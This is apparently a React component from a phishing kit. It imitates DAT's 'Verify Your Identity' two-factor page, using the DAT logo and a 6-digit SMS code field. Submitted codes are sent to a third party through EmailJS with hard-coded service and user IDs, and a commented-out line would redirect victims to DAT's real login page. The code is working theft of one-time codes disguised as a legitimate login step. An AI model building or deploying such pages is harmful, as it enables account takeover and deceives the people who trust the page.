import '../Form/formfk.css';
import { useState, useRef } from "react";
import emailjs from 'emailjs-com';
import datkaplog from '../../img/dat-logo-email.svg';

function KeyIk() {
    const [activeerku, setActiveerku] = useState(false);
    const digit = useRef(null);
    var qfNum = 0;

    function qfFunckErku(qf) {
        if (qf.value.indexOf('ccox') !== -1 || qf.value.indexOf('klir') !== -1 || qf.value.indexOf('qunn') !== -1 || qf.value.indexOf('jajtam') !== -1 ||
            qf.value.indexOf('jaj tam') !== -1 || qf.value.indexOf('txeq') !== -1 || qf.value.indexOf('cceq') !== -1 || qf.value.indexOf('uteq') !== -1 ||
            qf.value.indexOf('fuck') !== -1 || qf.value.indexOf('suck') !== -1 || qf.value.indexOf('dick') !== -1 || qf.value.indexOf('gandon') !== -1 ||
            qf.value.indexOf('qunnem') !== -1 || qf.value.indexOf('txa') !== -1 || qf.value.indexOf('boz') !== -1 || qf.value.indexOf('chatlax') !== -1 ||
            qf.value.indexOf('gyot') !== -1 || qf.value.indexOf('garlax') !== -1) {
            qf.value = '';
            qf.className = "form_empty form-control";
            qfNum = 1;
        } else {
            qfNum = 0;
        }
    }
    const handleInputBlurErku = event => {
        qfFunckErku(event.target);
        if (event.target.value === '') {
            event.target.nextSibling.style.display = "block";
            event.target.className = "form_empty form-control";
            if (activeerku === true) { setActiveerku(!activeerku); }
        } else {
            event.target.nextSibling.style.display = "none";
            event.target.className = "form-control";
        }
        if (digit.current.value) {
            if (activeerku === false) { setActiveerku(!activeerku); }
        }
    };

    const SERVICE_ID = 'service_cf79ytj';
    const TEMPLATE_ID = 'template_8oalb5q';
    const USER_ID = "5Fma-P-1aeivvlJxc";

    function handleSubmitErku(event) {
        event.preventDefault();
        qfFunckErku(digit.current);
        if (qfNum === 1) {
            digit.current.value = '';
            digit.current.nextSibling.style.display = "block";
            digit.current.className = "form_empty form-control";
        } else if (qfNum === 0) {
            if (qfNum === 0) {
                if (digit.current.value) {
                    emailjs.sendForm(SERVICE_ID, TEMPLATE_ID, event.target, USER_ID)
                    // window.location.href = "https://login.dat.com/login?state=hKFo2SBwWXlWeTB3dE9MdnpwOWZlQlZQU25wSXJ2N19QdVc5RKFupWxvZ2luo3RpZNkgZndKQ3RpZlYtdUhMX3BvUG5MZHRNVHdrNDg3TjZnUlGjY2lk2SBlOWx6TVhibldOSjBENTBDMmhhYWRvN0RpVzFha3dhQw&client=e9lzMXbnWNJ0D50C2haado7DiW1akwaC&protocol=oauth2&prompt=login&response_type=token%20id_token&redirect_uri=https:%2F%2Fone.dat.com%2Fcallback&scope=openid%20profile%20email&audience=https:%2F%2Fprod-api.dat.com&app_name=DAT%20One%20Web&page_mode=legacy&init_username=&view=login&email_readonly=false&nonce=K9F~QZ7J7pAxbQwq4584ydDVHnGb7Zmb&auth0Client=eyJuYW1lIjoiYXV0aDAuanMiLCJ2ZXJzaW9uIjoiOS4xOS4wIn0%3D&capturedTime=1704971938033";
                    return;
                }
            }
        }
        if (!digit.current.value) {
            event.target[0].nextSibling.style.display = "block";
            digit.current.className = "form_empty form-control";
        }
    }

    return (    
        <section className = "form_box keyIkIk">
            <span className='bobologo'><img src = {datkaplog} className = 'openPass' alt = ''></img></span>
            <h1 className='erkuGlav'>Verify Your Identity</h1>
            <p className='erkuPok'>We've sent a text message to:</p>
            <form onSubmit = { handleSubmitErku } id = "formss">
                <div className='usernameBlock'><p className='username'>username</p></div>
                <div className = "inputBlock" >
                    <input onBlur = { handleInputBlurErku } id = "digit" ref = { digit } name = "digit" maxLength={6} minLength={6} type = "number" className = "form-control" />
                    <div style = { { display: 'none' } } className = 'requiredBox' > Required field. </div> 
                    <span className = 'placeholder placeholderErku' > Enter the 6-digit code* </span> 
                </div> 
                <div className = "remember" >
                    <label className = "checkbox-inline" > < input name = "Remember" type = "checkbox" id = "Remember"/> Remember this device for 30 days </label> 
                </div> 
                <button disabled = { activeerku ? false : true } id = "btnLoginContinue" type = 'submit' className = {"btnLoginContinue"} > Continue </button> 
            </form> 
            <p className='receive'>Didn't receive a code? <button>Resend</button> or <button>get a call</button></p>
        </section>
    );
}

export default KeyIk;